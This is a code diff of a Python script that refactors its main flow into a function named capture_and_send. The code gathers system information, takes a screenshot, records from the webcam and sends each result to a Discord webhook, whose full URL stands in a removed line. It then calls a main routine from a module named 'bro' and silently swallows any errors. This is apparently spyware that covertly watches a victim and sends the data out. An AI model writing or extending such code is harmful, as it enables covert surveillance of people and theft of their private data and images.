@@ -4,21 +4,26 @@ from lpc import get_system_info
 from bro import main
 import os
 
-webhook_url = "https://discord.com/api/webhooks/1205108171769905202/-nPkymxlUmsdjFWCRXHDpjWO6opbKHQ8aHaevZFju-5xxswy5yReNuJSLQdLpnK7aKki"
-get_system_info(webhook_url)
+def capture_and_send(webhook_url, video_duration=10, num_cameras=1):
+    try:
+        # Step 1: Get system information and send it to Discord
+        get_system_info(webhook_url)
 
-# Take a screenshot
-screenshot_path = take_screenshot()
+        # Step 2: Take a screenshot
+        screenshot_path = take_screenshot()
 
-# Send the screenshot to Discord
-send_screenshot(screenshot_path)
+        # Step 3: Send the screenshot to Discord
+        send_screenshot(screenshot_path)
 
-# Call record_video to capture video from the webcam
-video_path = cam.record_video(video_duration=10, num_cameras=1)
+        # Step 4: Record a video from the webcam
+        video_path = cam.record_video(video_duration=video_duration, num_cameras=num_cameras)
 
-# Then, send the video to Discord
-cam.send_video_to_discord(video_path)
+        # Step 5: Send the video to Discord
+        cam.send_video_to_discord(video_path)
 
-main(webhook_url)
+        # Step 6: Execute the main function from bro (if necessary)
+        main(webhook_url)
 
 
+    except Exception as e:
+        print("")
